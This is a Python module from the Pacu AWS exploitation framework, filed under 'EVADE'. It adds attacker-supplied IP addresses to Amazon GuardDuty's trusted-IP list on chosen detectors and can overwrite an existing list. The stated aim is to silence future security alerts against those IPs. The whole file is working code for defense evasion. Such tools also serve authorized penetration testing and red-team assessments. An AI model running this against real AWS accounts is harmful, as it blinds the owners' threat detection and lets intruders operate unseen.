#!/usr/bin/env python3
import argparse
from botocore.exceptions import ClientError
import copy
import string
import random


module_info = {
    'name': 'guardduty__whitelist_ip',
    'author': 'Spencer Gietzen',
    'category': 'EVADE',
    'one_liner': 'Adds an IP address to the list of trusted IPs in GuardDuty.',
    'description': 'This module accepts a file containing IPv4 addresses and adds them to the GuardDuty list of trusted IPs to basically disable security alerts against these IPs. A remote file location is required for this list, as that is what the GuardDuty API requires. Note: This will not erase any existing GuardDuty findings, it will only prevent future findings related to the included IP addresses. WARNING: Only one list of trusted IP addresses is allowed per GuardDuty detector. This module will prompt you to delete an existing list if you would like, but doing so could have unintended bad consequences on the target AWS environment.',
    'services': ['GuardDuty'],
    'prerequisite_modules': ['detection__enum_services'],
    'external_dependencies': [],
    'arguments_to_autocomplete': ['--path', '--regions', '--targets'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
parser.add_argument('--path', required=True, help='A public link to a file containing a list of IP addresses to whitelist (such as an object in an S3 bucket). This link must stay online/public for as long as you want the IP list whitelisted.')
parser.add_argument('--regions', required=False, default=None, help='The set of regions to target GuardDuty detectors in (defaults to all session regions).')
parser.add_argument('--targets', required=False, default=None, help='Comma-separated list of GuardDuty detector IDs and regions to target (ex: sdasdasdasd@us-west2). By default, this module will check the database for enumerated detectors and offer to enumerate them if none are found.')


def main(args, pacu_main):
    session = pacu_main.get_active_session()
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input
    fetch_data = pacu_main.fetch_data
    get_regions = pacu_main.get_regions

    data = {'detectors': [], 'ip_sets': []}

    if args.targets:
        detectors = []
        regions = []
        targets = args.targets.split(',')
        for target in targets:
            id, region = target.split('@')
            detectors.append({'Id': id, 'Region': region})
            regions.append(region)
        regions = list(set(regions))
    else:
        regions = get_regions('GuardDuty')
        if fetch_data(['GuardDuty', 'Detectors'], module_info['prerequisite_modules'][0], '--guard-duty') is False:
            print('Pre-req module failed.')
            return
        detectors = copy.deepcopy(session.GuardDuty['Detectors'])

    for region in regions:
        client = pacu_main.get_boto3_client('guardduty', region)
        for detector in detectors:
            if detector['Region'] == region:
                print(' ({}) Detector {}:'.format(region, detector['Id']))
                data['detectors'].append(detector)
                try:
                    response = client.create_ip_set(
                        Activate=True,
                        DetectorId=detector['Id'],
                        Format='TXT',
                        Location=args.path,
                        Name=''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
                    )
                    ip_set_id = response['IpSetId']
                    data['ip_sets'].append(ip_set_id)
                    print('    Created IPSet: {}'.format(ip_set_id))
                except ClientError as error:
                    if 'an attempt to create resources beyond the current AWS account limits' in str(error):
                        print('    Error: Existing IPSet found')
                        print('    WARNING: Replacing an existing IPSet could have unintended bad consequences on the target environment. Proceed at your own risk.\n')
                        remove = input('Try to replace the IPSet? (y/n) ')
                        if remove.strip() == 'y':
                            try:
                                response = client.list_ip_sets(
                                    DetectorId=detector['Id']
                                )
                                # There is a max of one IPSet per detector
                                existing_ip_set_id = response['IpSetIds'][0]

                                client.update_ip_set(
                                    Activate=True,
                                    DetectorId=detector['Id'],
                                    Location=args.path,
                                    IpSetId=existing_ip_set_id
                                )

                                print('      Replaced IPSet {}...\n'.format(existing_ip_set_id))
                                data['ip_sets'].append(existing_ip_set_id)
                            except ClientError as error:
                                print('      Error: {}'.format(str(error)))
                    else:
                        print('      Error: {}'.format(str(error)))

    return data


def summary(data, pacu_main):
    return '{} IPSet(s) created for {} GuardDuty Detector(s).'.format(len(data['ip_sets']), len(data['detectors']))
